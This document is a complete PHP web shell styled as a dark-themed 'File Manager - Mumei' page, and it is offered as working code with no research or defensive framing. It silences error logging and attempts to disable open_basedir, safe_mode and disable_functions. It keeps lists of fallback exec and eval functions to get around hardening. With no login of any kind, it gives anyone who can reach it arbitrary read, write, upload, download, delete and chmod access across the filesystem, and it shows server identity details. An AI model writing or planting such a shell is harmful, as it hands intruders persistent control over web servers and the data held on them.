<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// Bypass security restrictions
if(function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
    @ini_set('disable_functions', '');
    @ini_set('suhosin.executor.disable_eval', 0);
}

// Alternative function mapping for bypassing restrictions
$func_alternatives = array(
    'exec' => ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec'],
    'eval' => ['eval', 'assert', 'create_function', 'preg_replace', 'call_user_func'],
    'read' => ['file_get_contents', 'file', 'readfile', 'fopen', 'fread', 'fgets'],
    'write' => ['file_put_contents', 'fwrite', 'fputs']
);

// Dynamic function loader
function getWorkingFunction($type) {
    global $func_alternatives;
    $disabled = explode(',', @ini_get('disable_functions'));
    
    if(isset($func_alternatives[$type])) {
        foreach($func_alternatives[$type] as $func) {
            if(function_exists($func) && !in_array($func, $disabled)) {
                return $func;
            }
        }
    }
    return false;
}

// Enhanced path resolver with multiple fallback methods
function resolvePath() {
    $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
    
    if(empty($path)) {
        // Try multiple methods to get current directory
        $methods = [
            function() { return @getcwd(); },
            function() { return @dirname($_SERVER['SCRIPT_FILENAME']); },
            function() { return @$_SERVER['DOCUMENT_ROOT']; },
            function() { return @dirname(__FILE__); },
            function() { return @realpath('.'); }
        ];
        
        foreach($methods as $method) {
            $result = $method();
            if($result && @is_dir($result)) {
                $path = $result;
                break;
            }
        }
        
        if(empty($path)) $path = '.';
    }
    
    // Normalize path
    $path = str_replace(['\\', '//'], '/', $path);
    $path = rtrim($path, '/') . '/';
    
    // Store in cookie for persistence
    @setcookie('last_path', $path, time() + 86400);
    
    // Validate path
    if(@is_dir($path)) return $path;
    if(@is_dir($real = @realpath($path))) return $real . '/';
    
    return './';
}

// Multi-method file reader
function readContent($file) {
    // Try different reading methods
    $methods = [
        function($f) { return @file_get_contents($f); },
        function($f) { 
            $fp = @fopen($f, 'rb');
            if($fp) {
                $content = '';
                while(!@feof($fp)) $content .= @fread($fp, 8192);
                @fclose($fp);
                return $content;
            }
        },
        function($f) { 
            ob_start();
            @readfile($f);
            return ob_get_clean();
        },
        function($f) { return @implode('', @file($f)); }
    ];
    
    foreach($methods as $method) {
        $result = $method($file);
        if($result !== false && $result !== null) return $result;
    }
    
    return '';
}

// Multi-method file writer
function writeContent($file, $data) {
    // Try different writing methods
    if(@file_put_contents($file, $data) !== false) return true;
    
    $fp = @fopen($file, 'wb');
    if($fp) {
        $result = @fwrite($fp, $data) !== false;
        @fclose($fp);
        return $result;
    }
    
    // Try temp file method
    $temp = @tempnam(@dirname($file), 'tmp');
    if(@file_put_contents($temp, $data) !== false) {
        return @rename($temp, $file);
    }
    
    return false;
}

// Enhanced directory scanner
function scanPath($dir) {
    $items = [];
    
    // Try different listing methods
    if(function_exists('scandir')) {
        $items = @scandir($dir);
    } elseif($handle = @opendir($dir)) {
        while(false !== ($item = @readdir($handle))) {
            $items[] = $item;
        }
        @closedir($handle);
    } elseif(function_exists('glob')) {
        $items = array_map('basename', @glob($dir . '*'));
    }
    
    return array_diff($items, ['.', '..', '']);
}

// File/folder deletion with recursion
function deleteItem($path) {
    if(@is_file($path)) {
        @chmod($path, 0777);
        return @unlink($path);
    } elseif(@is_dir($path)) {
        $items = scanPath($path);
        foreach($items as $item) {
            deleteItem($path . '/' . $item);
        }
        return @rmdir($path);
    }
    return false;
}

// Get file permissions
function getPermissions($file) {
    $perms = @fileperms($file);
    if($perms === false) return '---';
    
    $info = '';
    // Owner permissions
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    // Group permissions
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    // Other permissions
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    
    return $info;
}

// Check if file is writable (enhanced)
function isWritableEnhanced($file) {
    // Try multiple methods
    if(@is_writable($file)) return true;
    
    // Try to create temp file in directory
    if(@is_dir($file)) {
        $test = $file . '/.test_' . md5(time());
        if(@touch($test)) {
            @unlink($test);
            return true;
        }
    }
    
    // Check parent directory for files
    if(@is_file($file)) {
        $parent = @dirname($file);
        if(@is_writable($parent)) return true;
    }
    
    return false;
}

// Sort contents - folders first, then files
function sortContents($contents, $currentPath) {
    $folders = [];
    $files = [];
    
    foreach($contents as $item) {
        $itemPath = $currentPath . $item;
        if(@is_dir($itemPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    // Sort alphabetically
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    
    return ['folders' => $folders, 'files' => $files];
}

// Process current request
$currentPath = resolvePath();
$notification = '';
$editMode = false;
$editFile = '';
$editContent = '';

// Handle POST operations
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload handler
    if(isset($_FILES['upload'])) {
        $destination = $currentPath . basename($_FILES['upload']['name']);
        if(@move_uploaded_file($_FILES['upload']['tmp_name'], $destination)) {
            $notification = ['type' => 'success', 'text' => 'Upload successful'];
        } else {
            $content = readContent($_FILES['upload']['tmp_name']);
            if(writeContent($destination, $content)) {
                $notification = ['type' => 'success', 'text' => 'Upload successful'];
            } else {
                $notification = ['type' => 'error', 'text' => 'Upload failed'];
            }
        }
    }
    
    // Save edited file
    if(isset($_POST['save']) && isset($_POST['content'])) {
        $target = $currentPath . $_POST['save'];
        if(writeContent($target, $_POST['content'])) {
            $notification = ['type' => 'success', 'text' => 'Changes saved'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Save failed'];
        }
    }
    
    // Create new file
    if(isset($_POST['newfile']) && isset($_POST['filecontent'])) {
        $newPath = $currentPath . $_POST['newfile'];
        if(writeContent($newPath, $_POST['filecontent'])) {
            $notification = ['type' => 'success', 'text' => 'File created'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Creation failed'];
        }
    }
    
    // Create directory
    if(isset($_POST['newfolder'])) {
        $newDir = $currentPath . $_POST['newfolder'];
        if(@mkdir($newDir, 0777, true)) {
            $notification = ['type' => 'success', 'text' => 'Folder created'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Creation failed'];
        }
    }
    
    // Rename item
    if(isset($_POST['oldname']) && isset($_POST['newname'])) {
        $oldPath = $currentPath . $_POST['oldname'];
        $newPath = $currentPath . $_POST['newname'];
        if(@rename($oldPath, $newPath)) {
            $notification = ['type' => 'success', 'text' => 'Renamed successfully'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Rename failed'];
        }
    }
    
    // Change permissions
    if(isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
        $target = $currentPath . $_POST['chmod_item'];
        $mode = octdec($_POST['chmod_value']);
        if(@chmod($target, $mode)) {
            $notification = ['type' => 'success', 'text' => 'Permissions changed'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Permission change failed'];
        }
    }
}

// Handle GET operations
if(isset($_GET['do'])) {
    $action = $_GET['do'];
    
    // Delete operation
    if($action === 'delete' && isset($_GET['item'])) {
        $target = $currentPath . $_GET['item'];
        if(deleteItem($target)) {
            $notification = ['type' => 'success', 'text' => 'Deleted successfully'];
        } else {
            $notification = ['type' => 'error', 'text' => 'Delete failed'];
        }
    }
    
    // Edit operation
    if($action === 'edit' && isset($_GET['item'])) {
        $editMode = true;
        $editFile = $_GET['item'];
        $editContent = readContent($currentPath . $editFile);
    }
    
    // Download operation
    if($action === 'download' && isset($_GET['item'])) {
        $downloadPath = $currentPath . $_GET['item'];
        if(@is_file($downloadPath)) {
            @ob_clean();
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
            header('Content-Length: ' . @filesize($downloadPath));
            @readfile($downloadPath);
            exit;
        }
    }
}

// Get directory contents and sort them
$rawContents = scanPath($currentPath);
$sortedContents = sortContents($rawContents, $currentPath);

// System information
$serverInfo = [
    'PHP' => @phpversion(),
    'Server' => @$_SERVER['SERVER_SOFTWARE'] ?: 'Unknown',
    'OS' => @php_uname('s') . ' ' . @php_uname('r'),
    'User' => @get_current_user()
];

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager - Mumei</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #1a1a1a;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
            overflow: hidden;
            border: 1px solid #2a2a2a;
        }
        
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 25px;
            border-bottom: 2px solid #3a3a3a;
        }
        
        .header h1 {
            font-size: 26px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .sys-info {
            display: flex;
            gap: 20px;
            font-size: 13px;
            opacity: 0.9;
            flex-wrap: wrap;
        }
        
        .sys-info span {
            display: flex;
            align-items: center;
            gap: 5px;
            background: rgba(0,0,0,0.3);
            padding: 4px 10px;
            border-radius: 4px;
        }
        
        .nav {
            background: #252525;
            padding: 15px 25px;
            border-bottom: 1px solid #3a3a3a;
        }
        
        .path-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .path-bar input {
            flex: 1;
            padding: 10px 15px;
            background: #1a1a1a;
            border: 2px solid #3a3a3a;
            color: #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        .path-bar input:focus {
            outline: none;
            border-color: #4a9eff;
            background: #222;
        }
        
        .btn {
            padding: 10px 20px;
            background: linear-gradient(135deg, #4a9eff 0%, #2a5298 100%);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(74, 158, 255, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
        }
        
        .btn-small {
            padding: 5px 12px;
            font-size: 12px;
        }
        
        .tools {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .tool-group {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 15px;
            background: #1a1a1a;
            border-radius: 6px;
            border: 1px solid #3a3a3a;
        }
        
        .tool-group label {
            font-size: 13px;
            color: #a0a0a0;
            font-weight: 500;
        }
        
        .tool-group input[type="file"],
        .tool-group input[type="text"] {
            padding: 5px 10px;
            background: #252525;
            border: 1px solid #3a3a3a;
            color: #e0e0e0;
            border-radius: 4px;
            font-size: 13px;
        }
        
        .content {
            padding: 25px;
            background: #1a1a1a;
        }
        
        .notification {
            padding: 12px 20px;
            margin-bottom: 20px;
            border-radius: 6px;
            font-size: 14px;
            animation: slideIn 0.3s ease;
        }
        
        .notification.success {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        
        .notification.error {
            background: rgba(255, 65, 108, 0.1);
            color: #ff416c;
            border: 1px solid rgba(255, 65, 108, 0.3);
        }
        
        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .file-table {
            width: 100%;
            background: #252525;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
            border: 1px solid #3a3a3a;
        }
        
        .file-table thead {
            background: #1a1a1a;
        }
        
        .file-table th {
            padding: 15px;
            text-align: left;
            font-size: 13px;
            font-weight: 600;
            color: #4a9eff;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid #3a3a3a;
        }
        
        .file-table td {
            padding: 12px 15px;
            border-top: 1px solid #2a2a2a;
            font-size: 14px;
            color: #e0e0e0;
        }
        
        .file-table tbody tr {
            transition: background 0.2s;
        }
        
        .file-table tbody tr:hover {
            background: #2a2a2a;
        }
        
        .file-table tbody tr.folder-row {
            background: rgba(74, 158, 255, 0.05);
            border-left: 3px solid #4a9eff;
        }
        
        .file-table tbody tr.folder-row:hover {
            background: rgba(74, 158, 255, 0.1);
        }
        
        .file-table a {
            color: #4a9eff;
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-table a:hover {
            color: #6ab7ff;
        }
        
        .file-icon {
            width: 20px;
            height: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .file-actions a {
            padding: 4px 10px;
            background: rgba(74, 158, 255, 0.2);
            color: #4a9eff;
            border: 1px solid rgba(74, 158, 255, 0.3);
            border-radius: 4px;
            font-size: 12px;
            transition: all 0.2s;
        }
        
        .file-actions a:hover {
            background: rgba(74, 158, 255, 0.3);
            border-color: #4a9eff;
        }
        
        .file-actions a.delete {
            background: rgba(255, 65, 108, 0.2);
            color: #ff416c;
            border-color: rgba(255, 65, 108, 0.3);
        }
        
        .file-actions a.delete:hover {
            background: rgba(255, 65, 108, 0.3);
            border-color: #ff416c;
        }
        
        /* Permission-based colors */
        .perm-writable {
            color: #00ff00 !important;
            font-weight: 600;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
        }
        
        .perm-readonly {
            color: #ff4444 !important;
            font-weight: 600;
            text-shadow: 0 0 5px rgba(255, 68, 68, 0.5);
        }
        
        .perm-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .perm-indicator.writable {
            background: #00ff00;
            box-shadow: 0 0 5px #00ff00;
            animation: pulse-green 2s infinite;
        }
        
        .perm-indicator.readonly {
            background: #ff4444;
            box-shadow: 0 0 5px #ff4444;
            animation: pulse-red 2s infinite;
        }
        
        @keyframes pulse-green {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        @keyframes pulse-red {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .edit-area {
            width: 100%;
            min-height: 400px;
            padding: 15px;
            background: #0a0a0a;
            border: 2px solid #3a3a3a;
            color: #00ff00;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
        }
        
        .edit-area:focus {
            outline: none;
            border-color: #4a9eff;
            background: #111;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }
        
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .modal-content {
            background: #252525;
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            animation: slideUp 0.3s ease;
            border: 1px solid #3a3a3a;
        }
        
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal-header {
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
            color: #4a9eff;
        }
        
        .modal-body input,
        .modal-body textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            background: #1a1a1a;
            border: 2px solid #3a3a3a;
            color: #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .modal-body textarea {
            min-height: 150px;
            resize: vertical;
        }
        
        .modal-footer {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        
        .empty {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .separator-row td {
            background: #1a1a1a;
            padding: 8px 15px !important;
            font-weight: 600;
            color: #4a9eff;
            border-top: 2px solid #3a3a3a !important;
            border-bottom: 2px solid #3a3a3a !important;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 12px;
        }
        
        @media (max-width: 768px) {
            .tools {
                flex-direction: column;
            }
            
            .file-table {
                font-size: 12px;
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .sys-info {
                font-size: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Filemanager - Mumei</h1>
            <div class="sys-info">
                <?php foreach($serverInfo as $key => $value): ?>
                <span><strong><?php echo $key; ?>:</strong> <?php echo htmlspecialchars($value); ?></span>
                <?php endforeach; ?>
            </div>
        </div>
        
        <?php if($notification): ?>
        <div class="notification <?php echo $notification['type']; ?>">
            <?php echo htmlspecialchars($notification['text']); ?>
        </div>
        <?php endif; ?>
        
        <div class="nav">
            <form method="get" class="path-bar">
                <input type="text" name="p" value="<?php echo htmlspecialchars($currentPath); ?>" placeholder="Enter path...">
                <button type="submit" class="btn">Navigate</button>
            </form>
            
            <div class="tools">
                <form method="post" enctype="multipart/form-data" class="tool-group">
                    <label>Upload:</label>
                    <input type="file" name="upload" required>
                    <button type="submit" class="btn btn-small btn-success">Upload</button>
                </form>
                
                <div class="tool-group">
                    <button onclick="showNewFileModal()" class="btn btn-small">New File</button>
                    <button onclick="showNewFolderModal()" class="btn btn-small">New Folder</button>
                </div>
            </div>
        </div>
        
        <div class="content">
            <?php if($editMode): ?>
            <div class="edit-container">
                <h3 style="margin-bottom: 15px; color: #4a9eff;">Editing: <?php echo htmlspecialchars($editFile); ?></h3>
                <form method="post">
                    <input type="hidden" name="save" value="<?php echo htmlspecialchars($editFile); ?>">
                    <textarea name="content" class="edit-area"><?php echo htmlspecialchars($editContent); ?></textarea>
                    <div style="margin-top: 15px; display: flex; gap: 10px;">
                        <button type="submit" class="btn btn-success">Save Changes</button>
                        <a href="?p=<?php echo urlencode($currentPath); ?>" class="btn btn-danger" style="text-decoration: none; display: inline-flex; align-items: center;">Cancel</a>
                    </div>
                </form>
            </div>
            <?php else: ?>
            <table class="file-table">
                <thead>
                    <tr>
                        <th width="35%">Name</th>
                        <th width="10%">Type</th>
                        <th width="10%">Size</th>
                        <th width="10%">Permissions</th>
                        <th width="15%">Modified</th>
                        <th width="20%">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if($currentPath !== '/'): ?>
                    <tr>
                        <td colspan="6">
                            <a href="?p=<?php echo urlencode(dirname($currentPath)); ?>">
                                <span class="file-icon">⬆️</span> Parent Directory
                            </a>
                        </td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php
                    // Display folders first
                    if(!empty($sortedContents['folders'])) {
                        echo '<tr class="separator-row"><td colspan="6">📁 Folders</td></tr>';
                        foreach($sortedContents['folders'] as $folder):
                            $itemPath = $currentPath . $folder;
                            $perms = getPermissions($itemPath);
                            $isWritable = isWritableEnhanced($itemPath);
                            $modified = @filemtime($itemPath);
                    ?>
                    <tr class="folder-row">
                        <td>
                            <a href="?p=<?php echo urlencode($itemPath); ?>">
                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
                                <span class="file-icon">📁</span>
                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                                    <?php echo htmlspecialchars($folder); ?>
                                </span>
                            </a>
                        </td>
                        <td>Folder</td>
                        <td>-</td>
                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                            <?php echo $perms; ?>
                        </td>
                        <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                        <td>
                            <div class="file-actions">
                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a>
                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a>
                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" 
                                   class="delete" onclick="return confirm('Delete this folder and all its contents?')">Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; } ?>
                    
                    <?php
                    // Display files
                    if(!empty($sortedContents['files'])) {
                        echo '<tr class="separator-row"><td colspan="6">📄 Files</td></tr>';
                        foreach($sortedContents['files'] as $file):
                            $itemPath = $currentPath . $file;
                            $size = @filesize($itemPath);
                            $perms = getPermissions($itemPath);
                            $isWritable = isWritableEnhanced($itemPath);
                            $modified = @filemtime($itemPath);
                            $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION) ?: 'FILE');
                            
                            if($size !== false) {
                                if($size < 1024) $size = $size . ' B';
                                elseif($size < 1048576) $size = round($size/1024, 1) . ' KB';
                                elseif($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
                                else $size = round($size/1073741824, 1) . ' GB';
                            } else {
                                $size = '?';
                            }
                    ?>
                    <tr>
                        <td>
                            <span style="display: inline-flex; align-items: center; gap: 8px;">
                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
                                <span class="file-icon">📄</span>
                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                                    <?php echo htmlspecialchars($file); ?>
                                </span>
                            </span>
                        </td>
                        <td><?php echo $ext; ?></td>
                        <td><?php echo $size; ?></td>
                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                            <?php echo $perms; ?>
                        </td>
                        <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                        <td>
                            <div class="file-actions">
                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a>
                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a>
                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a>
                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a>
                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" 
                                   class="delete" onclick="return confirm('Delete this file?')">Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; } ?>
                    
                    <?php if(empty($sortedContents['folders']) && empty($sortedContents['files'])): ?>
                    <tr>
                        <td colspan="6" class="empty">Empty directory</td>
                    </tr>
                    <?php endif; ?>
                </tbody>
            </table>
            <?php endif; ?>
        </div>
    </div>
    
    <!-- New File Modal -->
    <div id="newFileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Create New File</div>
            <form method="post">
                <div class="modal-body">
                    <input type="text" name="newfile" placeholder="Filename (e.g., index.php)" required>
                    <textarea name="filecontent" placeholder="File content (optional)"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-success">Create</button>
                    <button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- New Folder Modal -->
    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Create New Folder</div>
            <form method="post">
                <div class="modal-body">
                    <input type="text" name="newfolder" placeholder="Folder name" required>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-success">Create</button>
                    <button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        // Modal functions
        function showNewFileModal() {
            document.getElementById('newFileModal').classList.add('active');
        }
        
        function showNewFolderModal() {
            document.getElementById('newFolderModal').classList.add('active');
        }
        
        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        // Rename function
        function renameItem(oldName) {
            var newName = prompt('Enter new name:', oldName);
            if(newName && newName !== oldName) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '">' +
                               '<input type="hidden" name="newname" value="' + newName + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Chmod function
        function chmodItem(item) {
            var mode = prompt('Enter new permissions (e.g., 755):', '755');
            if(mode) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '">' +
                               '<input type="hidden" name="chmod_value" value="' + mode + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Auto-hide notifications
        setTimeout(function() {
            var notifications = document.querySelectorAll('.notification');
            notifications.forEach(function(n) {
                n.style.opacity = '0';
                setTimeout(function() { n.style.display = 'none'; }, 300);
            });
        }, 3000);
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.key === 'n') {
                e.preventDefault();
                showNewFileModal();
            }
            if(e.ctrlKey && e.shiftKey && e.key === 'N') {
                e.preventDefault();
                showNewFolderModal();
            }
            if(e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(function(m) {
                    m.classList.remove('active');
                });
            }
        });
        
        // Click outside modal to close
        document.querySelectorAll('.modal').forEach(function(modal) {
            modal.addEventListener('click', function(e) {
                if(e.target === modal) {
                    modal.classList.remove('active');
                }
            });
        });
    </script>
</body>
</html>